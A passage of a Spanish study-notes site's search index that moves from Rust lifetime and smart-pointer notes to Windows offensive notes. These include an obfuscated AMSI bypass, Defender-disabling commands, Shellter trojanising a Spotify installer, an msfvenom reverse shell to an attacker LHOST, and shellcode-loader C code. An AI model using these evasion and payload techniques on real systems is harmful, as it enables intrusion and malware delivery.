main() {\n    let points = &amp;[Point(1, 0), Point(1, 0), Point(-1, 0), Point(0, -1)];\n    let nearest = {\n        let query = Point(0, 2);\n        find_nearest(points, &amp;query)\n    };\n    println!(\"{:?}\", nearest);\n}\n</code></pre> <pre><code>#[derive(Debug)]\nstruct Point(i32, i32);\n\nfn cab_distance(p1: &amp;Point, p2: &amp;Point) -&gt; i32 {\n    (p1.0 - p2.0).abs() + (p1.1 - p2.1).abs()\n}\n</code></pre> <ul> <li>Ac\u00e1 no neceista anotaciones, las referencias no salen de la funci\u00f3n.</li> </ul> <pre><code>fn find_nearest&lt;'a&gt;(points: &amp;'a [Point], query: &amp;Point) -&gt; Option&lt;&amp;'a Point&gt; {\n    let mut nearest = None;\n    for p in points {\n        if let Some((_, nearest_dist)) = nearest {\n            let dist = cab_distance(p, query);\n            if dist &lt; nearest_dist {\n                nearest = Some((p, dist));\n            }\n        } else {\n            nearest = Some((p, cab_distance(p, query)));\n        };\n    }\n    nearest.map(|(p, _)| p)\n}\n</code></pre> <p>Este c\u00f3digo lo que hace es buscar el punto m\u00e1s cercano a un punto de consulta (<code>query</code>) dentro de una lista de puntos (<code>points</code>). - <code>[Point]</code>: Es un slice de puntos, es decir, una vista de una secuencia contigua de elementos <code>Point</code>. - <code>Option&lt;&amp;'a Point&gt;</code>: Indica que la funci\u00f3n puede devolver un <code>Point</code> o <code>None</code> si no se encuentra ning\u00fan punto cercano. - Some ((p, dist)): Si se encuentra un punto m\u00e1s cercano, se almacena en una tupla junto con su distancia.</p> <p>Ac\u00e1 si importa lifetime: - <code>points: &amp;'a [Point]</code>: El slice de puntos vive al menos 'a. - <code>query: &amp;Point</code>: No necesita lifetime expl\u00edcito, ya que no sale de la funci\u00f3n. - <code>-&gt; Option&lt;&amp;'a Point&gt;</code>: El punto retornado vive al menos 'a, igual que los puntos en el slice.</p>"},{"location":"Rust/rust/","title":"Rust programming","text":"<ul> <li>Entendiendo las diferencias entre Rust, C++ moderno y ANSI C con estructuras de datos recursivas</li> <li>Estudiando Closures en Rust</li> <li>Smart pointers en Rust</li> <li>Lifetimes en Rust</li> <li>Iteradores en Rust</li> <li>Error Handling</li> </ul>"},{"location":"Rust/smart-pointers-rust/","title":"Smart pointers en Rust","text":""},{"location":"Rust/smart-pointers-rust/#boxt","title":"<code>Box&lt;T&gt;</code>","text":"<p>Box es un puntero inteligente que asigna datos en el heap en lugar del stack. Es \u00fatil para almacenar datos grandes o estructuras recursivas.</p> <pre><code>fn main() {\n    let five = Box::new(5);\n    println!(\"five: {}\", *five);\n}\n</code></pre> <ul> <li><code>Box&lt;T&gt;</code> implementa el trait <code>Deref</code>, lo que permite acceder al valor apuntado usando el operador <code>*</code>.</li> <li>Los tipos de datos recursivos o tipos de datos con tama\u00f1os din\u00e1micos no pueden almacenarse en l\u00ednea sin una indirecci\u00f3n de puntero. Box logra esa indirecci\u00f3n:</li> </ul> <pre><code>#[derive(Debug)]\nenum List&lt;T&gt; {\n    /// A non-empty list: first element and the rest of the list.\n    Element(T, Box&lt;List&lt;T&gt;&gt;),\n    /// An empty list.\n    Nil,\n}\n\nfn main() {\n    let list: List&lt;i32&gt; =\n        List::Element(1, Box::new(List::Element(2, Box::new(List::Nil))));\n    println!(\"{list:?}\");\n}\n</code></pre>"},{"location":"Rust/smart-pointers-rust/#caracteristicas-de-boxt","title":"Caracter\u00edsticas de <code>Box&lt;T&gt;</code>","text":"<p>Box es similar a <code>std::unique_ptr</code> en C++, pero garantiza que nunca ser\u00e1 null.</p> <p>Un Box es \u00fatil cuando:</p> <ul> <li>Tienes un tipo cuyo tama\u00f1o no se puede conocer en tiempo de compilaci\u00f3n, pero el compilador de Rust necesita conocer un tama\u00f1o exacto.</li> <li>Quieres transferir la propiedad de una gran cantidad de datos. Para evitar copiar grandes cantidades de datos en el stack, almacena los datos en el heap usando Box, as\u00ed solo se mueve el puntero.</li> </ul> <p>Si no us\u00e1ramos Box e intent\u00e1ramos incrustar una Lista directamente en la Lista, el compilador no podr\u00eda calcular un tama\u00f1o fijo para la estructura en memoria (la Lista ser\u00eda de tama\u00f1o infinito).</p> <p>Box resuelve este problema ya que tiene el mismo tama\u00f1o que un puntero regular y simplemente apunta al siguiente elemento de la Lista en el heap.</p> <p>Ejemplo de error del compilador: Si eliminas Box de la definici\u00f3n de List, obtendr\u00e1s el mensaje \"recursive without indirection\", porque para recursi\u00f3n de datos, debemos usar indirecci\u00f3n (Box o alg\u00fan tipo de referencia) en lugar de almacenar el valor directamente.</p> <p>Aunque Box se parece a <code>std::unique_ptr</code> en C++, no puede estar vac\u00edo/null. Esto hace que Box sea uno de los tipos que permiten al compilador optimizar el almacenamiento de algunos enums (la \"optimizaci\u00f3n de nicho\").</p>"},{"location":"Rust/smart-pointers-rust/#rct","title":"<code>Rc&lt;T&gt;</code>","text":"<p>Rc es un puntero compartido con conteo de referencias. \u00dasalo cuando necesites referirte a los mismos datos desde m\u00faltiples lugares. (Rc standfs for Reference Counted).</p> <pre><code>use std::rc::Rc;\n\nfn main() {\n    let a = Rc::new(10);\n    let b = Rc::clone(&amp;a);\n\n    dbg!(a);\n    dbg!(b);\n}\n</code></pre>"},{"location":"Rust/smart-pointers-rust/#caracteristicas-de-rct","title":"Caracter\u00edsticas de <code>Rc&lt;T&gt;</code>","text":"<ul> <li>El conteo de referencias de <code>Rc</code> asegura que el valor contenido sea v\u00e1lido mientras existan referencias.</li> <li><code>Rc</code> en Rust es similar a <code>std::shared_ptr</code> en C++.</li> <li><code>Rc::clone</code> es econ\u00f3mico: crea un puntero a la misma asignaci\u00f3n e incrementa el contador de referencias. No hace una clonaci\u00f3n profunda.</li> <li><code>make_mut</code> clona el valor interno si es necesario (\"clone-on-write\") y retorna una referencia mutable.</li> <li>Usa <code>Rc::strong_count</code> para verificar el contador de referencias.</li> <li><code>Rc::downgrade</code> proporciona un objeto con referencia d\u00e9bil para crear ciclos que se eliminen correctamente (probablemente en combinaci\u00f3n con <code>RefCell</code>).</li> </ul>"},{"location":"WindowsHacking/AVbypass/","title":"T\u00e9cnicas de Evasi\u00f3n y Bypass de Antivirus","text":"<p>Este documento detalla t\u00e9cnicas avanzadas para evadir software antivirus (AV), destinadas para uso \u00e9tico en pruebas de penetraci\u00f3n y actividades de red team. Incluye m\u00e9todos pr\u00e1cticos, herramientas y ejemplos, con un enfoque en la inyecci\u00f3n en memoria basada en PowerShell como t\u00e9cnica clave.</p>"},{"location":"WindowsHacking/AVbypass/#bypass-de-amsi-y-politica-de-ejecucion","title":"Bypass de AMSI y Pol\u00edtica de Ejecuci\u00f3n","text":""},{"location":"WindowsHacking/AVbypass/#bypass-de-politica-de-ejecucion","title":"Bypass de Pol\u00edtica de Ejecuci\u00f3n","text":"<ul> <li>Comando: <pre><code>PS C:\\&gt; powershell -ep bypass\n</code></pre></li> <li>Descripci\u00f3n: Desactiva las pol\u00edticas de ejecuci\u00f3n de PowerShell, permitiendo que los scripts se ejecuten sin restricciones impuestas por la configuraci\u00f3n de seguridad predeterminada.</li> </ul>"},{"location":"WindowsHacking/AVbypass/#bypass-de-amsi","title":"Bypass de AMSI","text":"<ul> <li>Comando: <pre><code>sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),( \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"( ${n`ULl},${t`RuE} )\n</code></pre></li> <li>Descripci\u00f3n: Desactiva la Interfaz de Escaneo Antimalware de Windows (AMSI) modificando din\u00e1micamente una variable para forzar un fallo de inicializaci\u00f3n. Esta t\u00e9cnica sigue sin parchearse por Microsoft y es efectiva para ejecutar scripts maliciosos sin ser detectados por motores de escaneo integrados.</li> </ul>"},{"location":"WindowsHacking/AVbypass/#desactivar-av-solo-administradores","title":"Desactivar AV (Solo Administradores)","text":""},{"location":"WindowsHacking/AVbypass/#desactivar-funciones-de-av","title":"Desactivar Funciones de AV","text":"<ul> <li>Comando: <pre><code>powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'\n</code></pre></li> <li>Descripci\u00f3n: Desactiva m\u00faltiples funciones de protecci\u00f3n de Windows Defender (monitoreo en tiempo real, escaneo de scripts, monitoreo de comportamiento, etc.). Requiere privilegios administrativos.</li> </ul>"},{"location":"WindowsHacking/AVbypass/#excluir-rutas-o-procesos","title":"Excluir Rutas o Procesos","text":"<ul> <li>Comando: <pre><code>powershell -command 'Add-MpPreference -ExclusionPath \"c:\\temp\" -ExclusionProcess \"c:\\temp\\yourstuffs.exe\"'\n</code></pre></li> <li>Descripci\u00f3n: Excluye directorios o procesos espec\u00edficos de los escaneos de Windows Defender, permitiendo que archivos potencialmente maliciosos se ejecuten sin interferencias.</li> </ul>"},{"location":"WindowsHacking/AVbypass/#tecnicas-de-inyeccion-de-codigo","title":"T\u00e9cnicas de Inyecci\u00f3n de C\u00f3digo","text":""},{"location":"WindowsHacking/AVbypass/#shellter","title":"Shellter","text":"<ul> <li>Descripci\u00f3n: Shellter inyecta cargas \u00fatiles en archivos ejecutables port\u00e1tiles (PE) leg\u00edtimos, como instaladores de aplicaciones populares (por ejemplo, Spotify). Modifica el flujo de ejecuci\u00f3n para insertar c\u00f3digo malicioso.</li> <li>Instalaci\u00f3n en Kali: <pre><code>kali@kali:~$ sudo apt install wine\nkali@kali:~$ sudo dpkg --add-architecture amd64\nkali@kali:~$ sudo apt install -y qemu-user-static binfmt-support\nkali@kali:~$ sudo apt-get update &amp;&amp; apt-get install wine32\n</code></pre></li> <li>Uso B\u00e1sico:<ol> <li>Ejecuta <code>shellter</code> en Kali bajo Wine.</li> <li>Selecciona el modo \"Auto\" (A).</li> <li>Especifica un archivo PE objetivo (por ejemplo, <code>/home/kali/Downloads/SpotifyFullWin10-32bit.exe</code>).</li> <li>Habilita el \"Modo Sigiloso\" para restaurar el flujo de ejecuci\u00f3n original despu\u00e9s de la ejecuci\u00f3n de la carga \u00fatil.</li> <li>Elige una carga \u00fatil (por ejemplo, shell inverso de Meterpreter) y configura LHOST/LPORT.</li> </ol> </li> <li>Ejemplo Pr\u00e1ctico:<ul> <li>Inyecta una carga \u00fatil de Meterpreter en un instalador de Spotify para evadir la detecci\u00f3n de Avira.</li> <li>Configura un listener en Kali:     <pre><code>msfconsole -x \"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;\"\n</code></pre></li> </ul> </li> </ul>"},{"location":"WindowsHacking/AVbypass/#inyeccion-en-memoria","title":"Inyecci\u00f3n en Memoria","text":"<ul> <li>Descripci\u00f3n: Inyecta shellcode directamente en la memoria de procesos en ejecuci\u00f3n, evitando escrituras en disco para evadir la detecci\u00f3n est\u00e1tica.</li> <li>T\u00e9cnicas Comunes:<ul> <li>Inyecci\u00f3n de DLL: Inyecta una DLL maliciosa en un proceso leg\u00edtimo.</li> <li>Process Hollowing: Reemplaza el contenido de un proceso leg\u00edtimo con c\u00f3digo malicioso.</li> </ul> </li> <li>Ventaja: Altamente efectivo contra an\u00e1lisis basados en disco.</li> </ul>"},{"location":"WindowsHacking/AVbypass/#inyeccion-en-memoria-con-powershell","title":"Inyecci\u00f3n en Memoria con PowerShell","text":"<ul> <li>Descripci\u00f3n: Aprovecha la capacidad de PowerShell para interactuar con las API de Windows y ejecutar cargas \u00fatiles maliciosas en la memoria del proceso actual de PowerShell (int\u00e9rprete x86). Esto evita escrituras en disco, dificultando la detecci\u00f3n.</li> <li>Ventajas:<ul> <li>Los scripts son m\u00e1s dif\u00edciles de marcar como maliciosos ya que se ejecutan dentro de un int\u00e9rprete y no como c\u00f3digo ejecutable.</li> <li>F\u00e1cilmente modificable (nombres de variables, comentarios, l\u00f3gica) para evadir detecci\u00f3n basada en firmas sin necesidad de recompilaci\u00f3n.</li> </ul> </li> <li>Pasos Clave:<ol> <li>Importar APIs de Windows: Usa <code>DllImport</code> para acceder a <code>VirtualAlloc</code>, <code>CreateThread</code> (de <code>kernel32.dll</code>) y <code>memset</code> (de <code>msvcrt.dll</code>) para asignaci\u00f3n de memoria, creaci\u00f3n de hilos y escritura de cargas \u00fatiles.</li> <li>Asignar Memoria: Reserva un bloque de memoria usando <code>VirtualAlloc</code> con permisos de lectura/escritura/ejecuci\u00f3n.</li> <li>Escribir Carga \u00datil: Copia el shellcode byte por byte en la memoria asignada usando <code>memset</code>.</li> <li>Ejecutar Carga \u00datil: Crea un nuevo hilo con <code>CreateThread</code> para ejecutar el shellcode.</li> </ol> </li> <li>Ejemplo de Script: (Ver contenido original para el script completo)</li> </ul>"},{"location":"WindowsHacking/AVbypass/#generacion-de-cargas-utiles","title":"Generaci\u00f3n de Cargas \u00datiles","text":"<ul> <li>Genera una carga \u00fatil de shell inverso usando <code>msfvenom</code>:     <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc\n</code></pre></li> <li>Copia el array de bytes <code>$sc</code> resultante en el script.</li> </ul>"},{"location":"WindowsHacking/AVbypass/#ofuscacion-y-cargas-utiles-personalizadas","title":"Ofuscaci\u00f3n y Cargas \u00datiles Personalizadas","text":""},{"location":"WindowsHacking/AVbypass/#ofuscacion","title":"Ofuscaci\u00f3n","text":"<ul> <li>Descripci\u00f3n: Modifica las cargas \u00fatiles para evitar coincidencias con firmas conocidas de AV.</li> <li>T\u00e9cnicas:<ul> <li>Codificaci\u00f3n (encoding de datos).</li> <li>Encriptaci\u00f3n (encryption de cargas \u00fatiles).</li> <li>Polimorfismo (cambios din\u00e1micos en el c\u00f3digo).</li> </ul> </li> </ul>"},{"location":"WindowsHacking/AVbypass/#cargas-utiles-personalizadas","title":"Cargas \u00datiles Personalizadas","text":"<ul> <li>Descripci\u00f3n: Crea cargas \u00fatiles \u00fanicas para evadir detecciones espec\u00edficas.</li> <li>Herramientas: Metasploit, Veil (para generar scripts ofuscados).</li> <li>Ejemplo: Usa Veil para crear un script de PowerShell o batch que evada COMODO AV en un entorno de autoejecuci\u00f3n FTP.</li> </ul>"},{"location":"WindowsHacking/AVbypass/#consejos-generales","title":"Consejos Generales","text":"<ul> <li>Conoce el AV Objetivo:<ul> <li>Investiga m\u00e9todos espec\u00edficos de detecci\u00f3n (firmas, heur\u00edsticas, comportamiento).</li> <li>Adapta las t\u00e9cnicas para explotar debilidades identificadas.</li> </ul> </li> <li>Uso \u00c9tico:<ul> <li>Aplica estas t\u00e9cnicas solo en entornos autorizados (pruebas de penetraci\u00f3n, laboratorios).</li> <li>Cumple con las leyes y regulaciones locales.</li> </ul> </li> <li>Evoluci\u00f3n Constante:<ul> <li>Los AV se actualizan frecuentemente; adapta las t\u00e9cnicas en consecuencia.</li> <li>Consulta recursos como el art\u00edculo de Microsoft sobre FinFisher o el documento de Emeric Nasi para m\u00e9todos avanzados.</li> </ul> </li> </ul>"},{"location":"WindowsHacking/AVbypass/#flujo-de-trabajo-ejemplo-evasion-con-shellter","title":"Flujo de Trabajo Ejemplo: Evasi\u00f3n con Shellter","text":"<ol> <li>Preparaci\u00f3n:<ul> <li>Descarga un ejecutable leg\u00edtimo (por ejemplo, instalador de Spotify).</li> <li>Instala Shellter en Kali con Wine.</li> </ul> </li> <li>Inyecci\u00f3n:<ul> <li>Usa Shellter en modo Auto, habilita el Modo Sigiloso e inyecta una carga \u00fatil de Meterpreter.</li> </ul> </li> <li>Ejecuci\u00f3n:<ul> <li>Transfiere el archivo modificado a una m\u00e1quina virtual con Windows y escanea con AV (por ejemplo, Avira).</li> <li>Configura un listener en Kali y verifica la conexi\u00f3n de Meterpreter.</li> </ul> </li> <li>Resultado: Ejecuci\u00f3n exitosa sin detecci\u00f3n, preservando la funcionalidad original del programa.</li> </ol>"},{"location":"WindowsHacking/localPayloadsDLL/","title":"Local Payload Execution - DLL","text":"<ul> <li>En este apunte se documentan las t\u00e9cnicas de ejecuci\u00f3n de payloads locales en Windows utilizando DLLs.</li> </ul>"},{"location":"WindowsHacking/localPayloadsDLL/#crear-una-dll","title":"Crear una DLL","text":"<ul> <li>Para crear una DLL en C podemos armar un proyecto en Visual Studio y utilizar el siguiente c\u00f3digo de ejemplo:</li> </ul> <p>Esta demostraci\u00f3n utilizar\u00e1 un cuadro de mensaje que aparece cuando la DLL se carga exitosamente. Crear un cuadro de mensaje se puede hacer f\u00e1cilmente con la API de Windows MessageBox. El fragmento de c\u00f3digo a continuaci\u00f3n ejecutar\u00e1 MsgBoxPayload cada vez que la DLL sea cargada en un proceso. Nota que los encabezados precompilados fueron removidos de la configuraci\u00f3n C/C++ del proyecto como se muestra en el m\u00f3dulo introductorio de Biblioteca de Enlace Din\u00e1mico.</p> <pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\nVOID MsgBoxPayload() {\n    MessageBoxA(NULL, \"Hacking\", \"Wow !\", MB_OK | MB_ICONINFORMATION);\n}\n\n\nBOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){\n\n    switch (dwReason){\n        case DLL_PROCESS_ATTACH: {\n            MsgBoxPayload();\n            break;\n        };\n        case DLL_THREAD_ATTACH:\n        case DLL_THREAD_DETACH:\n        case DLL_PROCESS_DETACH:\n            break;\n    }\n\n    return TRUE;\n}\n</code></pre>"},{"location":"WindowsHacking/localPayloadsDLL/#compilar-la-dll","title":"Compilar la DLL","text":"<ul> <li>Para compilar la DLL, podemos utilizar el comando <code>cl</code> de Visual Studio:</li> </ul> <pre><code>cl /LD /Fe:payload.dll payload.c user32.lib\n</code></pre>"},{"location":"WindowsHacking/localPayloadsDLL/#inyeccion-local-de-la-dll","title":"Inyecci\u00f3n local de la DLL","text":"<p>Recordemos que la WinAPI <code>LoadLibrary</code> se utiliza para cargar una DLL. Esta funci\u00f3n toma la ruta de una DLL en disco y la carga en el espacio de direcciones del proceso que la llama, que en nuestro caso ser\u00e1 el proceso actual. Cargar la DLL ejecutar\u00e1 su punto de entrada y, por lo tanto, ejecutar\u00e1 la funci\u00f3n <code>MsgBoxPayload</code>, haciendo que aparezca el cuadro de mensaje. Aunque el concepto es simple, ser\u00e1 \u00fatil en m\u00f3dulos posteriores para entender t\u00e9cnicas m\u00e1s complejas.</p> <p>El c\u00f3digo a continuaci\u00f3n tomar\u00e1 el nombre de la DLL como argumento de l\u00ednea de comandos, la cargar\u00e1 usando LoadLibraryA, y realizar\u00e1 algunas verificaciones de errores para asegurar que la DLL se carg\u00f3 exitosamente.</p> <pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\n\nint main(int argc, char* argv[]) {\n\n    if (argc &lt; 2){\n        printf(\"[!] Missing Argument; Dll Payload To Run \\n\");\n        return -1;\n    }\n\n    printf(\"[i] Injecting \\\"%s\\\" To The Local Process Of Pid: %d \\n\", argv[1], GetCurrentProcessId());\n\n\n    printf(\"[+] Loading Dll... \");\n    if (LoadLibraryA(argv[1]) == NULL) {\n        printf(\"[!] LoadLibraryA Failed With Error : %d \\n\", GetLastError());\n        return -1;\n    }\n    printf(\"[+] DONE ! \\n\");\n\n\n    printf(\"[#] Press &lt;Enter&gt; To Quit ... \");\n    getchar();\n\n    return 0;\n}\n</code></pre>"},{"location":"WindowsHacking/localPayloadsDLL/#local-payload-execution-shellcode","title":"Local Payload Execution - Shellcode","text":""},{"location":"WindowsHacking/localPayloadsDLL/#windows-api-necesarios","title":"Windows API necesarios","text":"<ul> <li>VirtualAlloc: Asigna memoria en el proceso actual que ser\u00e1 utilizada para almacenar el payload/shellcode.</li> <li>VirtualProtect: Modifica los permisos de protecci\u00f3n de la memoria asignada para hacerla ejecutable y poder ejecutar el payload.</li> <li>CreateThread: Crea un nuevo hilo de ejecuci\u00f3n que ejecutar\u00e1 el payload almacenado en la memoria asignada.</li> </ul>"},{"location":"WindowsHacking/localPayloadsDLL/#allocating-memory","title":"Allocating memory","text":"<pre><code>LPVOID VirtualAlloc(\n  [in, optional] LPVOID lpAddress,          // The starting address of the region to allocate (set to NULL)\n  [in]           SIZE_T dwSize,             // The size of the region to allocate, in bytes\n  [in]           DWORD  flAllocationType,   // The type of memory allocation\n  [in]           DWORD  flProtect           // The memory protection for the region of pages to be allocated\n);\n</code></pre> <p>El tipo de asignaci\u00f3n de memoria se especifica como <code>MEM_RESERVE | MEM_COMMIT</code>, que reserva un rango de p\u00e1ginas en el espacio de direcciones virtuales del proceso que realiza la llamada y confirma la memoria f\u00edsica para esas p\u00e1ginas reservadas. Las flags combinadas se discuten por separado a continuaci\u00f3n:</p> <ul> <li><code>MEM_RESERVE</code>: Se utiliza para reservar un rango de p\u00e1ginas sin confirmar realmente la memoria f\u00edsica.</li> <li><code>MEM_COMMIT</code>: Se utiliza para confirmar un rango de p\u00e1ginas en el espacio de direcciones virtuales del proceso.</li> </ul> <p>El \u00faltimo par\u00e1metro de <code>VirtualAlloc</code> establece los permisos en la regi\u00f3n de memoria. La forma m\u00e1s f\u00e1cil ser\u00eda establecer la protecci\u00f3n de memoria a <code>PAGE_EXECUTE_READWRITE</code>, pero esto generalmente es un indicador de actividad maliciosa para muchas soluciones de seguridad. Por lo tanto, la protecci\u00f3n de memoria se establece a <code>PAGE_READWRITE</code> ya que en este punto solo se requiere escribir el payload, pero no ejecutarlo. Finalmente, <code>VirtualAlloc</code> retornar\u00e1 la direcci\u00f3n base de la memoria asignada.</p>"},{"location":"WindowsHacking/localPayloadsDLL/#writing-payload-to-memory","title":"Writing Payload to memory","text":"<p>A continuaci\u00f3n, los bytes del payload desobfuscado se copian en la regi\u00f3n de memoria reci\u00e9n asignada en <code>pShellcodeAddress</code> y luego se limpia <code>pDeobfuscatedPayload</code> sobrescribi\u00e9ndolo con 0s. <code>pDeobfuscatedPayload</code> es la direcci\u00f3n base de un heap asignado por la funci\u00f3n <code>UuidDeobfuscation</code> que retorna los bytes del shellcode en bruto. Ha sido sobrescrito con ceros ya que ya no se requiere y por lo tanto esto reducir\u00e1 la posibilidad de que las soluciones de seguridad encuentren el payload en memoria.</p>"},{"location":"WindowsHacking/localPayloadsDLL/#modificando-la-proteccion-de-memoria","title":"Modificando la protecci\u00f3n de memoria","text":"<p>Antes de que el payload sea ejecutado, la protecci\u00f3n de memoria tiene que ser modificada desde solo <code>lectura/escritura</code> est\u00e1 permitido. VirtualProtect se utiliza para modificar las protecciones de memoria y para que el payload se ejecute necesitar\u00e1 ya sea <code>PAGE_EXECUTE_READ</code> o <code>PAGE_EXECUTE_READWRITE</code>.</p> <p>The VirtualProtect WinAPI function looks like the following based on its documentation</p> <pre><code>BOOL VirtualProtect(\n  [in]  LPVOID lpAddress,\n         // The base address of the memory region whose access protection is to be changed\n  [in]  SIZE_T dwSize,\n            // The size of the region whose access protection attributes are to be changed, in bytes\n  [in]  DWORD  flNewProtect,\n      // The new memory protection option\n  [out] PDWORD lpflOldProtect\n     // Pointer to a 'DWORD' variable that receives the previous access protection value of 'lpAddress'\n);\n</code></pre>"},{"location":"WindowsHacking/localPayloadsDLL/#payload-execution-via-createthread","title":"Payload Execution Via CreateThread","text":"<p>Finalmente, el payload es ejecutado creando un nuevo hilo usando la funci\u00f3n de la API de Windows <code>CreateThread</code> y pasando <code>pShellcodeAddress</code> que es la direcci\u00f3n del shellcode.</p> <p>La funci\u00f3n <code>CreateThread</code> de la WinAPI se ve de la siguiente manera bas\u00e1ndose en su documentaci\u00f3n</p> <pre><code>HANDLE CreateThread(\n  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,\n      // Set to NULL - optional\n  [in]            SIZE_T                  dwStackSize,\n             // Set to 0 - default\n  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,\n          // Pointer to a function to be executed by the thread, in our case its the base address of the payload\n  [in, optional]  __drv_aliasesMem LPVOID lpParameter,\n             // Pointer to a variable to be passed to the function executed (set to NULL - optional)\n  [in]            DWORD                   dwCreationFlags,\n         // Set to 0 - default\n  [out, optional] LPDWORD                 lpThreadId\n               // pointer to a 'DWORD' variable that receives the thread ID (set to NULL - optional)   \n);\n</code></pre>"},{"location":"WindowsHacking/localPayloadsDLL/#payload-execution-via-function-pointer","title":"Payload Execution via Function Pointer","text":"<p>Alternativamente, hay una forma m\u00e1s simple de ejecutar el shellcode sin usar la API de Windows <code>CreateThread</code>. En el ejemplo a continuaci\u00f3n, el shellcode se convierte a un puntero de funci\u00f3n VOID y el shellcode se ejecuta como un puntero de funci\u00f3n. El c\u00f3digo esencialmente salta a la direcci\u00f3n <code>pShellcodeAddress</code>.</p> <ul> <li><code>(*(VOID(*)()) pShellcodeAddress)();</code></li> <li>Es el equivalente a correr el siguiente c\u00f3digo:</li> </ul> <pre><code>    typedef VOID (WINAPI* fnShellcodefunc)();\n           // Defined before the main function\n    fnShellcodefunc pShell = (fnShellcodefunc) pShellcodeAddress;\n    pShell();\n</code></pre>"},{"location":"WindowsHacking/localPayloadsDLL/#createthread-vs-function-pointer","title":"CreateThread vs Function Pointer","text":"<p>Aunque es posible ejecutar shellcode usando el function pointer method, generalmente no se recomienda.  El shellcode generado por Msfvenom termina el hilo que lo llama despu\u00e9s de que termina de ejecutarse. Si el shellcode fue ejecutado usando el function pointer method, entonces el hilo que lo llama ser\u00e1 el hilo principal y por lo tanto todo el proceso saldr\u00e1 despu\u00e9s de que el shellcode termine de ejecutarse.</p> <p>Ejecutar el shellcode en un nuevo hilo previene este problema porque si el shellcode termina de ejecutarse, el nuevo hilo de trabajo ser\u00e1 terminado en lugar del hilo principal, evitando que todo el proceso termine.</p>"},{"location":"WindowsHacking/localPayloadsDLL/#waiting-for-the-thread-execution","title":"Waiting for the thread execution","text":"<p>Ejecutar el shellcode usando un nuevo hilo sin un breve retraso aumenta la probabilidad de que el hilo principal termine su ejecuci\u00f3n antes de que el hilo de trabajo que ejecuta el shellcode haya completado su ejecuci\u00f3n, lo que lleva a que el shellcode no se ejecute correctamente. Este escenario se ilustra en el fragmento de c\u00f3digo a continuaci\u00f3n.</p> <pre><code>int main(){\n\n    // ...\n\n    CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL); // Shellcode execution\n    return 0; // The main thread is done executing before the thread running the shellcode\n}\n</code></pre> <p>In the provided implementation, getchar() is used to pause the execution until the user provides input. In real implementations, a different approach should be used which utilizes the WaitForSingleObject WinAPI to wait for a specified time until the thread executes.</p> <p>The snippet below uses WaitForSingleObject to wait for the newly created thread to finish executing for 2000 milliseconds before executing the remaining code.</p>"},{"location":"WindowsHacking/localPayloadsDLL/#waitforsingleobject","title":"WaitForSingleObject","text":"<p>Espera hasta que el objeto especificado est\u00e9 en estado se\u00f1alizado o el intervalo de tiempo de espera transcurra.</p> <p>Para entrar en un estado de espera alertable, usa la funci\u00f3n WaitForSingleObjectEx. Para esperar m\u00faltiples objetos, usa WaitForMultipleObjects.</p> <pre><code>DWORD WaitForSingleObject(\n  [in] HANDLE hHandle,\n  [in] DWORD  dwMilliseconds\n);\n</code></pre>"},{"location":"WindowsHacking/localPayloadsDLL/#siguiendo","title":"Siguiendo...","text":"<pre><code>HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);\nWaitForSingleObject(hThread, 2000);\n\n// Remaining code\n</code></pre> <ul> <li>En el ejemplo a continuaci\u00f3n, WaitForSingleObject esperar\u00e1 indefinidamente a que el nuevo hilo termine de ejecutarse.</li> </ul> <pre><code>HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);\nWaitForSingleObject(hThread, INFINTE);\n</code></pre>"},{"location":"WindowsHacking/localPayloadsDLL/#main-function","title":"Main function","text":"<p>La funci\u00f3n principal utiliza <code>UuidDeobfuscation</code> para desobfuscar el payload, luego asigna memoria, copia el shellcode a la regi\u00f3n de memoria y lo ejecuta.</p> <pre><code>int main() {\n\n    PBYTE       pDeobfuscatedPayload  = NULL;\n    SIZE_T      sDeobfuscatedSize     = NULL;\n\n    printf(\"[i] Injecting Shellcode The Local Process Of Pid: %d \\n\", GetCurrentProcessId());\n    printf(\"[#] Press &lt;Enter&gt; To Decrypt ... \");\n    getchar();\n\n    printf(\"[i] Decrypting ...\");\n\n    // if not\n    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &amp;pDeobfuscatedPayload, &amp;sDeobfuscatedSize)) {\n        return -1;\n    }\n    printf(\"[+] DONE !\\n\");\n    printf(\"[i] Deobfuscated Payload At : 0x%p Of Size : %d \\n\", pDeobfuscatedPayload, sDeobfuscatedSize);\n\n    printf(\"[#] Press &lt;Enter&gt; To Allocate ... \");\n    getchar();\n    // alocamos memoria\n    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    //if not\n    if (pShellcodeAddress == NULL) {\n        printf(\"[!] VirtualAlloc Failed With Error : %d \\n\", GetLastError());\n        return -1;\n    }\n    printf(\"[i] Allocated Memory At : 0x%p \\n\", pShellcodeAddress);\n\n    printf(\"[#] Press &lt;Enter&gt; To Write Payload ... \");\n    getchar();\n    // tambien podemos usar RtlMoveMemory de ntdll.dll\n    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);\n    memset(pDeobfuscatedPayload, '\\0', sDeobfuscatedSize);\n\n\n    DWORD 